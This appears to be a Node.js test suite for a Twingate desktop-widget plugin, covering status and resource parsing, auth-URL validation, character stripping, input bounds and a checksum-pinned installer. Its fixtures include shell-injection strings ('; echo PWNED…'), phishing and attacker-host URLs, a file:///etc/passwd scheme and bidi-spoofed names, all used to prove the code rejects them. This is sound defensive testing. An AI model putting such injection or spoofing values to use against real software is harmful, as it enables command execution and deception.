// Model.js is loaded by QML as a plain script (no module system), so it has no
// exports. Rather than compromise the plugin file for the sake of the tests, the
// tests evaluate it and lift the functions out.

const { test } = require("node:test")
const assert = require("node:assert")
const fs = require("node:fs")
const path = require("node:path")

const source = fs.readFileSync(path.join(__dirname, "..", "Model.js"), "utf8")
const Model = new Function(
  source +
    "; return { stripAnsi, normalizeStatus, isConnected, isDaemonDown, statusLabel," +
    " statusDetail, parseResources, resourceAddress, resourceHeading, parseAuthUrl, sharedAuthStatus, isCountdownAuthStatus, stripControl, clientUrl, CLIENT_BUILDS, CLIENT_VERSION, clampField, MAX_INPUT, READ_LIMIT, MAX_RESOURCES }"
)()

const ESC = "\x1b"

test("normalizeStatus maps the CLI vocabulary", () => {
  assert.equal(Model.normalizeStatus("online"), "online")
  assert.equal(Model.normalizeStatus("offline"), "offline")
  assert.equal(Model.normalizeStatus("authenticating"), "authenticating")
  assert.equal(Model.normalizeStatus("not-running"), "not-running")
})

test("normalizeStatus tolerates whitespace, case and trailing output", () => {
  assert.equal(Model.normalizeStatus("  Online \n"), "online")
  assert.equal(Model.normalizeStatus("ONLINE"), "online")
  // Only the first line is the status token; later lines are noise.
  assert.equal(Model.normalizeStatus("online\nsome trailing chatter"), "online")
  // Seen across CLI versions.
  assert.equal(Model.normalizeStatus("notrunning"), "not-running")
})

test("normalizeStatus reports unknown rather than guessing", () => {
  // A wrong state drives the wrong toggle action, so anything unrecognised
  // must stay unknown instead of collapsing to offline.
  assert.equal(Model.normalizeStatus(""), "unknown")
  assert.equal(Model.normalizeStatus("reconnecting-soon"), "unknown")
  assert.equal(Model.normalizeStatus(null), "unknown")
})

test("daemon-down is distinct from signed-out", () => {
  assert.equal(Model.isDaemonDown("not-running"), true)
  assert.equal(Model.isDaemonDown("offline"), false)
  assert.equal(Model.isConnected("online"), true)
  assert.equal(Model.isConnected("authenticating"), false)
})

test("every state has a label", () => {
  for (const state of ["online", "offline", "authenticating", "not-running", "missing", "unknown"]) {
    assert.ok(Model.statusLabel(state).length > 0, state)
  }
})

test("every state that needs explaining has a detail", () => {
  for (const state of ["offline", "authenticating", "missing", "unknown"]) {
    assert.ok(Model.statusDetail(state).length > 0, state)
  }
})

test("connected has no detail, because reachability is not something we know", () => {
  // `twingate status` saying "online" is not the same as a resource being
  // reachable. Asserting it would state a proxy signal as fact.
  assert.equal(Model.statusDetail("online"), "")
})

test("not-running is the ordinary off state, labelled as such", () => {
  // There is no disconnected-but-running state: both `twingate stop` and
  // `twingate disconnect` exit the client, taking twingate.service with it.
  // So this is what "off" looks like, and calling it "Service stopped" with a
  // warning badge presented normal operation as a fault.
  assert.equal(Model.statusLabel("not-running"), "Disconnected")
  assert.equal(Model.statusDetail("not-running"), "")
})

test("stripAnsi removes colour escapes", () => {
  assert.equal(Model.stripAnsi(ESC + "[1mbold" + ESC + "[0m"), "bold")
})

// Captured verbatim from a real connected client, 2026-08-25. The columns are
// TAB-separated AND space-padded, which is what makes a space-run split wrong.
const T = "\t"
const REAL = [
  "RESOURCE NAME       " + T + "ADDRESS            " + T + "ALIAS" + T + "AUTH STATUS",
  "Docker VM           " + T + "192.0.2.10         " + T + "-    " + T + "Auth expires in 4 days",
  // Address exactly fills its column: a lone tab follows, no padding.
  "Jellyfin            " + T + "assets.example.test" + T + "-    " + T + "Auth expires in 4 days",
  // Name exactly fills its column: a lone tab follows, no padding.
  "Twingate Connector 2" + T + "192.0.2.40         " + T + "-    " + T + "Auth expires in 4 days",
  "acme Access         " + T + "*.example.com      " + T + "-    " + T + "Auth expires in 4 days"
].join("\n")

test("parseResources reads the real tab-separated table", () => {
  const r = Model.parseResources(REAL)
  assert.equal(r.length, 4)
  assert.deepEqual(
    { name: r[0].name, address: r[0].address, alias: r[0].alias, authStatus: r[0].authStatus },
    { name: "Docker VM", address: "192.0.2.10", alias: "", authStatus: "Auth expires in 4 days" }
  )
})

test("parseResources handles an address that exactly fills its column", () => {
  // The regression: a lone tab with no padding used to fuse address+alias, so
  // the row rendered its auth status where the address belonged. The fixture
  // host is exactly 19 characters for that reason -- do not "tidy" its length.
  const filled = Model.parseResources(REAL).find(r => r.name === "Jellyfin")
  assert.equal(filled.address, "assets.example.test")
  assert.equal(filled.authStatus, "Auth expires in 4 days")
  assert.equal(Model.resourceAddress(filled), "assets.example.test")
})

test("parseResources handles a name that exactly fills its column", () => {
  // This one used to come through as a single field: name and address fused.
  const conn = Model.parseResources(REAL).find(r => r.name === "Twingate Connector 2")
  assert.ok(conn, "row should not have fused name and address")
  assert.equal(conn.address, "192.0.2.40")
})

test("parseResources keeps names containing single spaces", () => {
  const r = Model.parseResources(REAL)
  assert.ok(r.some(x => x.name === "acme Access"))
})

test("a wildcard resource is listed but is not openable", () => {
  // It has no single address, so resourceAddress rejects it and the UI falls
  // back to copying rather than inventing a URL.
  const wild = Model.parseResources(REAL).find(r => r.name === "acme Access")
  assert.equal(wild.address, "*.example.com")
  assert.equal(Model.resourceAddress(wild), "")
})

test("parseResources normalises an absent alias", () => {
  // The CLI writes "-", which must not be rendered as if it were a hostname.
  assert.equal(Model.parseResources(REAL)[0].alias, "")
})

test("parseResources skips the column header", () => {
  assert.ok(!Model.parseResources(REAL).some(r => /^resource name$/i.test(r.name)))
})

test("parseResources skips --all section headings", () => {
  // `--all` prefixes a bare "MAIN RESOURCES" line with no tab.
  const withHeading = "MAIN RESOURCES\n" + REAL
  const r = Model.parseResources(withHeading)
  assert.ok(!r.some(x => x.name === "MAIN RESOURCES"))
  assert.equal(r.length, 4)
})

test("parseResources drops the disconnected notice, not the table", () => {
  assert.deepEqual(Model.parseResources("Twingate must be connected to display available resources."), [])
})

test("parseResources handles empty and blank input", () => {
  assert.deepEqual(Model.parseResources(""), [])
  assert.deepEqual(Model.parseResources("\n\n   \n"), [])
  assert.deepEqual(Model.parseResources(null), [])
})

test("sharedAuthStatus collapses a uniform column, and only a uniform one", () => {
  const r = Model.parseResources(REAL)
  assert.equal(Model.sharedAuthStatus(r), "Auth expires in 4 days")
  r[1].authStatus = "Auth required"
  assert.equal(Model.sharedAuthStatus(r), "")
  assert.equal(Model.sharedAuthStatus([]), "")
})

test("resourceAddress only accepts host-shaped values", () => {
  assert.equal(Model.resourceAddress({ address: "db.internal.example" }), "db.internal.example")
  assert.equal(Model.resourceAddress({ address: "192.0.2.10" }), "192.0.2.10")
  assert.equal(Model.resourceAddress({ address: "Online" }), "Online")
  assert.equal(Model.resourceAddress({ address: "not a host" }), "")
  assert.equal(Model.resourceAddress({ address: "" }), "")
  assert.equal(Model.resourceAddress(null), "")
})

test("resourceHeading carries the count and the scope", () => {
  assert.equal(Model.resourceHeading(8, "default"), "Resources (8)")
  assert.equal(Model.resourceHeading(1, "default"), "Resources (1)")
  assert.equal(Model.resourceHeading(0, "default"), "Resources (0)")
  // "All" is the only signal that hidden entries are included.
  assert.equal(Model.resourceHeading(8, "all"), "All resources (8)")
})

// Real `twingate status -v -d` output captured while authenticating, 2026-08-25.
const VERBOSE_AUTHENTICATING = `Authenticating: None

Visit the following URL to authenticate to your Twingate network:

https://acme.twingate.com/client-node/login?redirect_uri=https%3A%2F%2Facme.twingate.com%2Fapi%2Fv5%2Fclient%2Flogin%3Fdevice_hardware_id%3Dabc123%26auth_session_id%3Dxyz789
`

test("parseAuthUrl pulls the sign-in URL out of verbose status", () => {
  const url = Model.parseAuthUrl(VERBOSE_AUTHENTICATING)
  assert.ok(url.startsWith("https://acme.twingate.com/client-node/login"))
  assert.ok(url.includes("auth_session_id%3Dxyz789"))
  // Must not swallow the trailing newline into the URL handed to xdg-open.
  assert.equal(url, url.trim())
})

test("parseAuthUrl returns empty when there is no URL", () => {
  assert.equal(Model.parseAuthUrl("not-running"), "")
  assert.equal(Model.parseAuthUrl(""), "")
  assert.equal(Model.parseAuthUrl(null), "")
})

test("parseAuthUrl will not fall back to a URL the label did not introduce", () => {
  // The real round-2 bug: `label === -1 ? text : text.slice(label)`, which on
  // a missing label searched the WHOLE buffer and would hand tenant-controlled
  // output to a browser with no user action. A URL with no anchor above it
  // must yield nothing, however well-formed it looks.
  assert.equal(Model.parseAuthUrl("https://evil.example/phish"), "")
  assert.equal(Model.parseAuthUrl(
    "Some resource notes\nhttps://evil.example/phish\nmore prose"), "")
  // And a decoy label that is NOT the sign-in sentence must not qualify it.
  assert.equal(Model.parseAuthUrl(
    "Visit the following URL for documentation https://evil.example/phish"), "")
  // The real sentence still works.
  assert.equal(Model.parseAuthUrl(
    "Visit the following URL to authenticate:\nhttps://x.twingate.com/login"),
    "https://x.twingate.com/login")
})

test("parseAuthUrl refuses non-https schemes", () => {
  // The result goes straight to xdg-open, so file:// and http:// must not pass.
  // Every fixture must carry the anchor label: without it the parser returns
  // early and this passes no matter what the URL rules say. Three tests here
  // were doing exactly that, so the scheme, boundary and credential rules had
  // no coverage at all -- deleting them left the whole suite green.
  const A = "Visit the following URL to authenticate:\n"
  assert.equal(Model.parseAuthUrl(A + "file:///etc/passwd"), "")
  assert.equal(Model.parseAuthUrl(A + "http://evil.example/login"), "")
})

test("parseAuthUrl stops at whitespace and quotes", () => {
  // Needs the CLI's label now: without it the parser returns nothing rather
  // than falling back to the first URL it can find anywhere.
  const url = Model.parseAuthUrl(
    "Visit the following URL to authenticate:\nhttps://x.twingate.com/login?a=1 then some prose")
  assert.equal(url, "https://x.twingate.com/login?a=1")
})

test("isCountdownAuthStatus suppresses countdowns of any length", () => {
  // A countdown has no action attached: when it lapses you turn the switch on
  // and sign in, which is the ordinary flow. Warning about it changes nothing.
  assert.equal(Model.isCountdownAuthStatus("Auth expires in 4 days"), true)
  assert.equal(Model.isCountdownAuthStatus("Auth expires in 1 day"), true)
  assert.equal(Model.isCountdownAuthStatus("Auth expires in 3 hours"), true)
  assert.equal(Model.isCountdownAuthStatus("auth expires in 20 minutes"), true)
})

test("isCountdownAuthStatus keeps anything that explains a failure", () => {
  // These say a resource is unreachable NOW, which answers "why can I not
  // reach this?" even though the remedy is the same sign-in.
  assert.equal(Model.isCountdownAuthStatus("Auth required"), false)
  assert.equal(Model.isCountdownAuthStatus("Expired"), false)
  // Vocabulary this plugin does not know must never be suppressed.
  assert.equal(Model.isCountdownAuthStatus("Reauthentication pending"), false)
  assert.equal(Model.isCountdownAuthStatus(""), false)
  assert.equal(Model.isCountdownAuthStatus(null), false)
})

test("stripAnsi needs the ESC introducer, so bracketed names survive", () => {
  // The regex is written \x1b\[... as an escape, not as a literal 0x1b byte.
  // With a literal byte the source looked like /\[[0-9;]*[A-Za-z]/ to readers
  // and to anything that strips control characters -- two separate reviewers
  // read it that way and reported a corruption bug. This test pins the
  // behaviour so a silent degradation would fail here.
  assert.equal(Model.stripAnsi("Prod [eu-west] DB"), "Prod [eu-west] DB")
  assert.equal(Model.stripAnsi("Build [2b] host"), "Build [2b] host")
  assert.equal(Model.stripAnsi(ESC + "[1mbold" + ESC + "[0m"), "bold")
})

test("parsed fields carry no control characters", () => {
  // Resource names are set by whoever administers the Twingate network, and a
  // name reaches the clipboard. A CR pasted into a terminal without bracketed
  // paste executes what follows it.
  const r = Model.parseResources("wat\r\u0007ch\thost.example\t-\tAuth expires in 4 days")
  assert.equal(r[0].name, "watch")
  assert.ok(!/[\x00-\x1f\x7f]/.test(r[0].name))
})

test("parseAuthUrl anchors to the CLI's own label", () => {
  // `twingate` prints documentation links too. Taking the first https:// in
  // the output would hand the browser whichever came first if a future version
  // reordered it -- silently, with no code change here.
  const out = [
    "Learn more: https://www.twingate.com/docs/linux-headless",
    "",
    "Visit the following URL to authenticate to your Twingate network:",
    "",
    "https://acme.twingate.com/client-node/login?x=1"
  ].join("\n")
  assert.equal(Model.parseAuthUrl(out), "https://acme.twingate.com/client-node/login?x=1")
})

test("parseAuthUrl requires a token boundary", () => {
  const A = "Visit the following URL to authenticate:\n"
  assert.equal(Model.parseAuthUrl(A + "xhttps://evil.example/path"), "")
})

test("parseAuthUrl refuses an over-long URL", () => {
  // A bound with no test: deleting it left the suite green.
  const A = "Visit the following URL to authenticate:\n"
  assert.equal(Model.parseAuthUrl(A + "https://evil.example/" + "a".repeat(3000)), "")
  // ...and the bound must not reject an ordinary sign-in URL.
  const ok = "https://veepee.twingate.com/api/auth?token=" + "b".repeat(200)
  assert.equal(Model.parseAuthUrl(A + ok), ok)
})

test("parseAuthUrl still rejects credentials and non-https", () => {
  const A = "Visit the following URL to authenticate:\n"
  assert.equal(Model.parseAuthUrl(A + "https://user:pass@evil.example/x"), "")
  assert.equal(Model.parseAuthUrl(A + "http://evil.example/x"), "")
  assert.equal(Model.parseAuthUrl(A + "file:///etc/passwd"), "")
})

test("normalizeStatus matches the state token as a prefix", () => {
  // Captured from a real client. When a resource needs per-resource
  // re-authentication the CLI writes the token with NO trailing newline and
  // appends prose to the same line. Requiring equality reported "unknown"
  // while the client was connected -- urgent badge, switch off, and a panel
  // saying the CLI was unrecognisable.
  const real = "onlineA resource you attempted to access requires additional authentication.\n" +
               "Open the following URL to authorize access to the resource:\n\n" +
               "https://example.com/login/oauth/authorize?client_id=x"
  assert.equal(Model.normalizeStatus(real), "online")
})

test("normalizeStatus does not confuse offline with online", () => {
  // "offline" must never win via the "online" prefix, in either direction.
  assert.equal(Model.normalizeStatus("offline"), "offline")
  assert.equal(Model.normalizeStatus("offlineSomething appended"), "offline")
  assert.equal(Model.normalizeStatus("onlineSomething appended"), "online")
})

test("resource count is bounded, and truncation is reported", () => {
  // Resource names and addresses come from whoever administers the Twingate
  // network. Unbounded, a hostile or merely enormous tenant degrades the
  // long-lived shell process itself, not a disposable app.
  let many = ""
  for (let i = 0; i < 5000; i++) many += `name${i}\t10.0.0.1\t-\tOK\n`
  const r = Model.parseResources(many)
  assert.equal(r.length, 200)
  assert.equal(r.truncated, true, "must flag that the list was cut")
})

test("individual fields are bounded, well above any legal value", () => {
  // The cap protects the process from a hostile field; it must not truncate a
  // legitimate one, so it sits far above the 253-character DNS maximum.
  const r = Model.parseResources("x".repeat(9000) + "\t10.0.0.1\t-\tOK")
  // The contract is "long enough for any legal value, short enough to bound
  // the process" -- not one specific number, which a deliberate bump would
  // break for no reason.
  assert.ok(r[0].name.length > 253, "must not clamp below the DNS maximum")
  assert.ok(r[0].name.length < 4096, "must still bound the process")
  assert.ok(r[0].name.endsWith("…"), "truncation is visible, not silent")
})

test("a normal fleet is untouched by the bounds", () => {
  const r = Model.parseResources(REAL)
  assert.equal(r.length, 4)
  assert.equal(r.truncated, undefined)
})

test("the client is pinned to an immutable versioned URL", () => {
  // The reviewer's objection was that root-executed bytes could change after
  // the commit was approved. A version in the path is what prevents that;
  // the mutable "stable" path must never appear here.
  for (const arch of ["x86_64", "aarch64"]) {
    const url = Model.clientUrl(arch)
    assert.ok(url.includes("/" + Model.CLIENT_VERSION + "/"), `${arch} not versioned`)
    assert.ok(!url.includes("/stable/"), `${arch} still uses the mutable path`)
    assert.ok(url.startsWith("https://binaries.twingate.com/"), `${arch} wrong host`)
  }
})

test("every pinned build carries a full sha256", () => {
  // Twingate publishes no signature, so this digest is the only integrity
  // control in the chain. A short or missing one would silently weaken it.
  for (const [arch, b] of Object.entries(Model.CLIENT_BUILDS)) {
    assert.match(b.sha256, /^[0-9a-f]{64}$/, `${arch} digest`)
    assert.ok(b.file.endsWith(".pkg.tar.zst"), `${arch} file`)
  }
})

test("an unknown architecture yields no URL rather than a wrong one", () => {
  assert.equal(Model.clientUrl("riscv64"), "")
})

test("heading marks a truncated list rather than asserting the cap is the total", () => {
  assert.equal(Model.resourceHeading(200, "default", true), "Resources (200+)")
  assert.equal(Model.resourceHeading(4, "default", false), "Resources (4)")
  assert.equal(Model.resourceHeading(8, "all", true), "All resources (8+)")
})

test("parseAuthUrl returns nothing when the CLI printed no label", () => {
  // The fallback silently restored "first https:// anywhere", and this result
  // is opened in a browser with no user action.
  assert.equal(Model.parseAuthUrl("junk https://attacker.example/steal?x=1"), "")
})

test("bidi and zero-width characters are stripped", () => {
  // They reach the renderer and the clipboard, where they spoof a name.
  assert.equal(Model.stripControl("invoice‮gnp.exe"), "invoicegnp.exe")
  assert.equal(Model.stripControl("a​b﻿c"), "abc")
})

test("a legal 253-character FQDN is not clamped into uselessness", () => {
  // MAX_FIELD used to sit BELOW the legal maximum, so a long address was
  // ellipsised, failed the host check, and became uncopyable and unopenable.
  // Exactly 253 characters: the DNS maximum, which is the point of the test.
  const fqdn = ("a".repeat(63) + ".").repeat(3) + "a".repeat(61)
  const r = Model.parseResources("host\t" + fqdn + "\t-\tOK")
  assert.equal(r[0].address, fqdn)
  assert.equal(Model.resourceAddress(r[0]), fqdn, "must still be openable")
})

test("clamping never splits a surrogate pair", () => {
  const name = "x".repeat(1023) + "\u{1F600}"
  const r = Model.parseResources(name + "\t10.0.0.1\t-\tOK")
  assert.ok(!/[\uD800-\uDBFF](?![\uDC00-\uDFFF])/.test(r[0].name), "lone high surrogate")
})

test("input past the 1 MB bound is never parsed", () => {
  // The previous version of this test asserted r.length === 200, which is the
  // ROW cap -- true with or without the input clamp -- and a 1s timing bound
  // with 25x headroom. Deleting the clamp left the whole suite green. Assert
  // the observable consequence instead: a row lying beyond MAX_INPUT does not
  // exist, and the row cap is provably not what ended the loop.
  const pad = "p".repeat(20000)
  let big = ""
  for (let i = 0; i < 60; i++) big += `n${i}${pad}\t10.0.0.1\t-\tOK\n`
  big += "SENTINEL\t10.0.0.9\t-\tOK\n"
  const r = Model.parseResources(big)
  assert.ok(r.length < 200, "the row cap must not be what ends this")
  assert.ok(!r.some(x => x.name.startsWith("SENTINEL")),
    "a row past MAX_INPUT must never be parsed")
})

// ── Guards over the QML, which node cannot execute ────────────────────
//
// These source-assert things a mutation test proved the suite could not see:
// every one of them was removable with the whole suite still green. QML is not
// runnable here, so grepping it is the available tool -- and a coarse guard on
// a real invariant beats no guard at all.

const PANEL = fs.readFileSync(path.join(__dirname, "..", "Panel.qml"), "utf8")
const SERVICE = fs.readFileSync(path.join(__dirname, "..", "Service.qml"), "utf8")

test("every Text rendering plugin data declares PlainText", () => {
  // Qt's default AutoText renders a leading tag as HTML, and resource names
  // are set by whoever administers the Twingate network.
  // Scan each block to its own closing brace rather than a fixed window: a
  // fixed window produced a false positive on the one element whose
  // textFormat sits 21 lines in, behind stacked comments.
  const lines = PANEL.split("\n")
  // Matches multi-line `Text {` blocks, which is every one in this file. A
  // single-line `Text { ... }` would be skipped, so the count assertion below
  // is what catches one being introduced.
  const declared = (PANEL.match(/\bText\s*\{/g) || []).length
  let checked = 0
  lines.forEach((line, i) => {
    const m = line.match(/^(\s*)Text\s*\{\s*$/)
    if (!m) return
    const indent = m[1].length
    let body = ""
    for (let j = i + 1; j < lines.length; j++) {
      if (lines[j].match(new RegExp(`^\\s{${indent}}\\}\\s*$`))) break
      body += lines[j] + "\n"
    }
    checked++
    assert.ok(/textFormat:\s*Text\.PlainText/.test(body),
      `Text block at line ${i + 1} does not set textFormat`)
  })
  assert.ok(checked >= 7, `expected at least 7 Text blocks, checked ${checked}`)
  assert.equal(checked, declared,
    `${declared - checked} Text block(s) were not scanned -- likely written on one line`)
})

test("the install button is wired to the installer", () => {
  // Rewiring it to something harmless left the suite green.
  assert.ok(/onClicked:\s*twingate\.installClient\(\)/.test(PANEL),
    "install button must call installClient()")
})

test("the resource heading is told whether the list was truncated", () => {
  // Dropping the third argument silently rendered the cap as the total.
  assert.ok(/Model\.resourceHeading\([^)]*,[^)]*,[^)]*\)/.test(SERVICE),
    "resourceHeading must be called with the truncated flag")
})

test("lastError is sanitised and clamped before it is stored", () => {
  // It reaches the renderer, the shell log and IPC.
  assert.ok(/lastError\s*=\s*Model\.clampField\(Model\.stripControl\(/.test(SERVICE),
    "lastError must be stripped and clamped")
})

test("diagnostics reports truncation", () => {
  assert.ok(/resourcesTruncated:/.test(SERVICE))
})

test("a second terminal action is refused visibly, not silently", () => {
  // Returning silently while toggleConnection had already set _desired moved
  // the switch and let it snap back 30s later.
  const fn = SERVICE.slice(SERVICE.indexOf("function runInTerminal"))
  const body = fn.slice(0, fn.indexOf("\n  }"))
  assert.ok(/if \(actionPending\)/.test(body), "must guard on actionPending")
  // Scoped to the guard's own block. Scanning the whole function matched the
  // rate-limit branch's assignment instead, so deleting this one went unseen.
  const guard = body.slice(body.indexOf("if (actionPending)"))
  const block = guard.slice(0, guard.indexOf("\n    }"))
  assert.ok(/lastError\s*=/.test(block), "the refusal must be visible")
  assert.ok(/_log\(/.test(block), "the refusal must be logged")
  assert.ok(/return false/.test(body), "must report the refusal to the caller")
})

// ── Security round 3 ──────────────────────────────────────────────────
// Each of these failed against the code as it stood before the fix; the
// review that found them proved the previous suite stayed green without them.

test("the auth-URL anchor cannot be preempted by earlier output", () => {
  // This URL is opened in a browser with NO user action, and search() returns
  // the FIRST match, so a generic label appearing earlier in tenant-controlled
  // output would be the thing opened.
  const out = [
    // Carries the PREVIOUS anchor verbatim. A decoy the old anchor already
    // rejected would leave this test green on both sides of the fix.
    "Visit the following URL for documentation https://attacker.example/phish",
    "",
    "Visit the following URL to authenticate to your Twingate network:",
    "https://real.twingate.com/login"
  ].join("\n")
  assert.equal(Model.parseAuthUrl(out), "https://real.twingate.com/login")
})

test("the auth URL must sit near its label", () => {
  // A label far above an unrelated URL is not an introduction to it.
  assert.equal(
    Model.parseAuthUrl("Visit the following URL to authenticate\n\n\n\n\nhttps://far.example/a"), "")
  assert.equal(
    Model.parseAuthUrl("Visit the following URL to authenticate\nhttps://near.example/a"),
    "https://near.example/a")
})

test("input clipped by MAX_INPUT is REPORTED, not silently dropped", () => {
  // The output cap set `truncated`; the input clamp did not, so resources
  // vanished while the heading asserted the short count was the whole list.
  //
  // The rows are deliberately LONG and FEW: a fixture that also exceeds the
  // 200-row cap has `truncated` set by that cap instead, and cannot see
  // whether the input clamp reports anything at all.
  const pad = "p".repeat(9000)
  const rows = 150
  const huge = "NAME\tADDRESS\tTYPE\tSTATUS\n" +
    Array.from({ length: rows }, (_, i) => `n${i}${pad}\ta${i}.example\tt\ton`).join("\n")
  assert.ok(huge.length > 1048576, "fixture must exceed MAX_INPUT")
  const parsed = Model.parseResources(huge)
  assert.ok(parsed.length < 200, `fixture must stay under the row cap, parsed ${parsed.length}`)
  assert.ok(parsed.length < rows, "some rows must actually have been clipped")
  assert.equal(parsed.truncated, true, "a clipped buffer must be flagged")
  assert.ok(Model.resourceHeading(parsed.length, "all", parsed.truncated).includes("+"))
})

test("a list that fits is not marked truncated", () => {
  const small = Model.parseResources("NAME\tADDRESS\tTYPE\tSTATUS\nn\ta\tt\ton\n")
  assert.equal(small.truncated, undefined)
  assert.ok(!Model.resourceHeading(small.length, "all", small.truncated).includes("+"))
})

test("stripControl removes every invisible class, not just the common ones", () => {
  // U+061C is the one Unicode Bidi_Control character the first range missed --
  // exactly the class the strip exists for. U+2028/9 are worse than invisible:
  // Qt renders them as line breaks inside a Text, so a resource name can break
  // the row, and they reach the clipboard as newlines.
  const invisible = {
    "U+061C": "؜", "U+2028": " ", "U+2029": " ",
    "U+0085": "", "U+009B": "", "U+00AD": "­",
    "U+2060": "⁠", "U+FFF9": "￹",
    "U+202E": "‮", "U+200B": "​"
  }
  for (const [name, ch] of Object.entries(invisible)) {
    assert.equal(Model.stripControl("a" + ch + "b"), "ab", `${name} survived`)
  }
  // And it must not eat ordinary text.
  assert.equal(Model.stripControl("Café — naïve 日本語"), "Café — naïve 日本語")
})

// ── The installer, rendered rather than grepped ───────────────────────
// The previous test asserted the SHAPE of the source (`for (var arch in ...)`),
// which is not behaviour: it stayed green through the round-1 regression that
// hardcoded x86_64 and made the verified aarch64 digest unreachable. This
// renders the real script from the real source and asserts what it contains.

function renderInstallScript(buildsOverride) {
  // Executes the REAL installClient() out of Service.qml, with runInTerminal
  // stubbed to capture what it was handed. Rebuilding the branch loop here
  // instead would test a reimplementation: the round-1 regression hardcoded
  // x86_64 in exactly that loop, and a test carrying its own copy of the loop
  // would have stayed green through it.
  // One extractor, not two: this was a character-for-character copy of
  // extractFunction() and did not get its comment/regex hardening.
  const body = extractFunction("installClient")
  let captured = null
  const run = (cmd) => { captured = cmd; return true }
  const model = buildsOverride
    ? Object.assign(Object.create(null), Model, { CLIENT_BUILDS: buildsOverride })
    : Model
  new Function("Model", "runInTerminal", "_log", body + "; installClient()")(
    model, run, () => {})
  assert.ok(captured !== null, "installClient() launched nothing")
  return captured
}

test("the rendered installer contains every pinned build", () => {
  const script = renderInstallScript()
  const arches = Object.keys(Model.CLIENT_BUILDS)
  assert.ok(arches.length >= 2, "expected more than one architecture to be pinned")
  for (const arch of arches) {
    const b = Model.CLIENT_BUILDS[arch]
    // Quoted, not bare: validation already makes the pattern safe, so this is
    // the second of the two independent guards, and it must not quietly go.
    assert.ok(script.includes("'" + arch + "')"), `${arch} branch missing or unquoted`)
    assert.ok(script.includes(b.sha256), `${arch} digest missing from the script`)
    assert.ok(script.includes(Model.clientUrl(arch)), `${arch} URL missing from the script`)
  }
})

test("the rendered installer verifies before it installs", () => {
  const script = renderInstallScript()
  assert.ok(script.includes("sha256sum -c"), "no checksum verification")
  assert.ok(script.indexOf("sha256sum -c") < script.indexOf("pacman -U"),
    "the checksum must be verified BEFORE pacman runs")
  assert.ok(!script.includes("--noconfirm"), "the user must confirm the install")
  assert.ok(script.includes("CHECKSUM MISMATCH"), "no refusal path on mismatch")
})

test("every pinned URL is immutable and version-qualified", () => {
  // A mutable /latest/ path is the whole reason the digest pin exists: the
  // bytes behind it can change after review.
  for (const arch of Object.keys(Model.CLIENT_BUILDS)) {
    const url = Model.clientUrl(arch)
    assert.ok(url.startsWith("https://"), `${arch}: not https`)
    assert.ok(url.includes(Model.CLIENT_VERSION), `${arch}: URL is not version-qualified`)
    assert.ok(!/\blatest\b/.test(url), `${arch}: URL is mutable`)
  }
})

test("a malformed CLIENT_BUILDS entry cannot reach the shell", () => {
  // Runs the REAL installClient() against a poisoned table. Asserting the
  // regexes here instead would test a copy of the validation rather than the
  // validation -- removing it from Service.qml would leave this green.
  const poisoned = {
    "x86_64) echo PWNED-VIA-KEY ;; zz": { file: "f.pkg.tar.zst", sha256: "0".repeat(64) },
    "aarch64": { file: "'; echo PWNED-VIA-FILE; x='", sha256: "0".repeat(64) },
    "riscv64": { file: "f.pkg.tar.zst", sha256: "'; echo PWNED-VIA-SUM; x='" }
  }
  const script = renderInstallScript(poisoned)
  for (const marker of ["PWNED-VIA-KEY", "PWNED-VIA-FILE", "PWNED-VIA-SUM"]) {
    assert.ok(!script.includes(marker), `${marker} reached the generated shell`)
  }
  // Every real entry still renders -- the validation must not be so strict it
  // rejects the builds this plugin actually ships.
  const real = renderInstallScript()
  for (const arch of Object.keys(Model.CLIENT_BUILDS)) {
    assert.ok(real.includes(Model.CLIENT_BUILDS[arch].sha256), `${arch} was wrongly rejected`)
  }
})

// ── Source guards for the QML-side bounds ─────────────────────────────

test("every stdout/stderr read is clamped before parsing", () => {
  // StdioCollector has no size cap. normalizeStatus runs on EVERY poll on the
  // thread that draws the desktop; a 5 MB buffer cost 532ms there.
  const reads = SERVICE.match(/String\((?:status|verbose|resources)(?:Stdout|Stderr)\.text \|\| ""\)[^\n]*/g) || []
  assert.ok(reads.length >= 5, `expected at least 5 collector reads, saw ${reads.length}`)
  for (const r of reads) {
    // READ_LIMIT, not MAX_INPUT: reading at exactly the parse bound is what
    // made a clipped list indistinguishable from a complete one.
    assert.ok(r.includes("slice(0, Model.READ_LIMIT)"), `unclamped collector read: ${r.trim()}`)
  }
})

// Runs the REAL runInTerminal() against a stub host, with a controllable
// clock. The previous version of this test grepped the source, which a
// `if (false && now - _lastLaunchMs < minLaunchGapMs)` defeats silently --
// verified. This is the only guard on the launch floor, so it executes.
function makeHost(overrides) {
  const host = Object.assign({
    minLaunchGapMs: 5000,
    _lastLaunchMs: 0,
    actionPending: false,
    lastError: "",
    connectionState: "online",
    _stateAtAction: "",
    launches: [],
    now: 1000000,
    bar: null,
    settleTimer: { elapsed: 0, restart() {} },
    _log() {}
  }, overrides || {})
  host.bar = host.bar === null ? { run: (c) => host.launches.push(c) } : host.bar
  const body = extractFunction("runInTerminal")
  host.runInTerminal = new Function("self", "Util", `
    const Date = { now: () => self.now }
    with (self) { ${body}; return runInTerminal }
  `)(host, { shellQuote: (x) => "'" + String(x).replace(/'/g, "'\\''") + "'" })
  return host
}

test("the launch floor refuses a second action within the window", () => {
  const h = makeHost()
  assert.equal(h.runInTerminal("twingate start"), true, "first launch was refused")
  assert.equal(h.launches.length, 1)

  // Immediately after: refused, visibly.
  h.actionPending = false           // the poll cleared it, as it really does
  assert.equal(h.runInTerminal("twingate start"), false, "the floor did not hold")
  assert.equal(h.launches.length, 1, "a refused action still launched a terminal")
  assert.match(h.lastError, /rate limited/, "the refusal was silent")

  // Still inside the window, even at the last millisecond.
  h.now += h.minLaunchGapMs - 1
  assert.equal(h.runInTerminal("twingate start"), false, "the floor ended early")

  // Past it: allowed again.
  h.now += 2
  assert.equal(h.runInTerminal("twingate start"), true, "the floor never released")
  assert.equal(h.launches.length, 2)
})

test("observed state cannot shorten the launch floor", () => {
  // The whole point: actionPending is cleared by a status poll, and the
  // launched action is what moves the state, so clearing it must not re-open
  // the window.
  const h = makeHost()
  h.runInTerminal("twingate start")
  h.actionPending = false
  h.connectionState = "online"
  h.now += 10   // a poll came back almost instantly
  assert.equal(h.runInTerminal("twingate start"), false,
    "a status poll shortened a wall-clock floor")
})

test("the floor is armed only when a terminal actually launched", () => {
  // Arming on a refused action would extend the window without doing anything.
  const h = makeHost({ bar: { run: () => { throw new Error("must not launch") } } })
  h.actionPending = true            // refused for a different reason
  assert.equal(h.runInTerminal("x"), false)
  assert.equal(h._lastLaunchMs, 0, "a refused action armed the floor")
})

